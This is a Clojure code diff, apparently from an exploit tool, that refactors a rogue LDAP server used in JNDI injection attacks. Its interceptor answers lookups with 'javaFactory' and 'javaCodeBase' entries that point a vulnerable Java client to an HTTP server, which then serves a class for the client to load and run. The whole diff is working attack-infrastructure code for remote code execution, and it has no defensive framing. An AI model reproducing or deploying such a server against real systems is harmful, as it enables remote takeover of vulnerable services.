@@ -18,20 +18,26 @@
     (.addAttribute "javaFactory" class-name)
     (.addAttribute "javaCodeBase" url)))
 
-(defn create-interceptor [url class-name]
+(defn create-interceptor [app-conf]
   (proxy [InMemoryOperationInterceptor]
          []
     (processSearchResult [result]
-      (let [_ (println "[+] LDAP request detected")
-            base (.getBaseDN (.getRequest result))
+      (let [base (.getBaseDN (.getRequest result))
+            _ (println "[+] LDAP request detected " base)
+            url (str "http://localhost:" (:port app-conf) "/")
+            class-name (:class-name (:java8 app-conf))
             entry (add-entry base url class-name)
             ldap-result (new LDAPResult 0 ResultCode/SUCCESS)]
-        (.sendSearchEntry result entry)
-        (.setResult result ldap-result)))))
+        (if (= base (:ldap-base (:java8 app-conf)))
+          (do (doto result
+               (.sendSearchEntry entry)
+               (.setResult ldap-result))
+              nil)
+          nil)))))
 
-(defn start [url class-name]
+(defn start [app-conf]
   (let [listenerConfig (InMemoryListenerConfig/createLDAPConfig "listen" 1389)
-        interceptor (create-interceptor url class-name)
+        interceptor (create-interceptor app-conf)
         config (doto
                 (new InMemoryDirectoryServerConfig (into-array String ["dc=example,dc=com"]))
                  (.setListenerConfigs (into-array InMemoryListenerConfig [listenerConfig]))
